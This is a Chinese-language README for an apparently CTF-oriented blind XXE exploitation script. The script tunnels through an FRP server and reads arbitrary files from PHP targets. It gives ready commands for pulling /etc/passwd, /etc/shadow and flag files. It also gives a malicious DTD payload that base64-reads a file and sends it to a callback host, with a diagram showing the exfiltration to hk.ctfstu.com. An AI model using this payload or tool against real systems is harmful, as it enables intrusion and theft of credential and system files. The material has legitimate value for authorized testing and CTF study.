# Blind XXE 无回显漏洞一键利用脚本

> OOB (Out-of-Band) 方式利用盲 XXE 漏洞，读取服务器任意文件。

## 功能

- 自动检测目标是否在同一局域网
- 不在同一局域网时自动配置 FRP 端口映射
- 启动 Web 服务提供恶意 DTD 文件
- 启动 TCP 监听接收回传数据
- 发送 XXE Payload 并解码显示结果

## 环境要求

- Python 3.6+
- Linux / macOS (Windows 可使用 WSL)
- 可选：`frpc` 可执行文件（脚本会自动下载）

## 快速开始

```bash
# 读取 /etc/passwd
python3 xxe_exploit.py -t http://目标IP:端口/xxe.php -f /etc/passwd

# 读取其他文件
python3 xxe_exploit.py -t http://目标IP:端口/xxe.php -f /opt/flag.txt

# 局域网模式（不走 FRP）
python3 xxe_exploit.py -t http://目标IP:端口/xxe.php -f /etc/passwd --local
```

## 参数说明

| 参数                | 简写 | 默认值        | 说明                                          |
| ------------------- | ---- | ------------- | --------------------------------------------- |
| `--target`          | `-t` | **必填**      | 目标 URL，如 `http://example.com/doLogin.php` |
| `--file`            | `-f` | `/etc/passwd` | 要读取的服务器文件路径                        |
| `--local`           |      | `false`       | 强制本地模式，跳过 FRP（LAN 环境）            |
| `--web-port`        |      | 自动          | Web 服务本地端口                              |
| `--nc-port`         |      | 自动          | NC 监听本地端口                               |
| `--web-remote-port` |      | 自动          | Web 服务 FRP 远端端口                         |
| `--nc-remote-port`  |      | 自动          | NC 监听 FRP 远端端口                          |
| `--nc-timeout`      |      | `30`          | 等待回传数据的超时时间（秒）                  |
| `--frpc`            |      | 自动查找      | frpc 可执行文件路径                           |

## 工作流程

```
┌─────────────┐     FRP 端口映射     ┌──────────────┐
│  攻击者 Kali  │ ◄───────────────── │ FRP 服务器    │
│              │                     │ (hk.ctfstu.com)│
│  HTTP Server │◄──── 8180 ────────┤              │
│  NC Listener │◄──── 7776 ────────┤              │
│              │                     └──────┬───────┘
└─────────────┘                              │
                                             │
                                    ┌────────┴────────┐
                                    │  目标服务器       │
                                    │                  │
                                    │ ① 请求 DTD 文件   │
                                    │    → hk.ctfstu.com:8180/1.dtd
                                    │                  │
                                    │ ② 解析 DTD，      │
                                    │    读取文件并     │
                                    │    base64 编码     │
                                    │                  │
                                    │ ③ 回传编码数据     │
                                    │    → hk.ctfstu.com:7776/?p=base64...
                                    └──────────────────┘
```

## 配置文件

运行前修改脚本开头的全局配置：

```python
FRP_SERVER_ADDR = "hk.ctfstu.com"   # FRP 服务器地址
FRP_SERVER_PORT = 7000               # FRP 服务器端口
FRP_AUTH_TOKEN = "your_token"        # FRP 认证 Token
```

## 脚本生成的文件

所有文件生成在脚本所在目录：

| 文件        | 说明                                     |
| ----------- | ---------------------------------------- |
| `1.dtd`     | 恶意 DTD 文件（PHP filter 方式读取文件） |
| `frpc.toml` | FRP 客户端配置文件                       |
| `frpc.log`  | FRP 运行日志                             |

## 注意事项

1. **仅 PHP 目标有效** — DTD 默认使用 `php://filter` 读取文件，其他后端（Java、Python、.NET）需要修改读取方式
2. **需出外网** — 目标服务器需要能访问 FRP 服务器（外网），否则数据回传失败
3. **Token 安全** — 脚本中的 FRP Token 请勿公开泄露
4. **局域网场景** — 如果目标与本机在同一局域网，使用 `--local` 模式可省去 FRP

## 示例

```bash
# 公网目标，默认端口
python3 xxe_exploit.py -t http://target.com/api/xml

# 指定端口和文件
python3 xxe_exploit.py -t http://target.com:8080/doLogin.php -f /etc/shadow

# 局域网目标
python3 xxe_exploit.py -t http://192.168.1.100/xml.php -f /etc/hosts --local

# 自定义等待时间（网络延迟高时）
python3 xxe_exploit.py -t http://target.com/api -f /root/flag.txt --nc-timeout 60
```

## DTD 文件说明（自定义）

如需读取方式不是 `php://filter`，可手动编辑 `1.dtd`：

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://回调地址:端口/?p=%file;'>">
```

## 常见问题

**Q: FRP 端口全部探测失败？**
A: 检查 `FRP_SERVER_ADDR` 和 `FRP_AUTH_TOKEN` 配置是否正确，以及本机能否访问 FRP 服务器 7000 端口。

**Q: 发送 Payload 后收不到回传？**
A: 可能原因：目标没有解析外部实体、防火墙阻止出站、PHP `allow_url_fopen` 被禁用、回调地址端口被屏蔽。

**Q: HTTP 000 错误？**
A: 检查目标 URL 的端口号是否正确（常见非 80 端口有 8000、8080、8888 等）。

---

*版本 1.0 — 仅供授权的安全测试使用。*
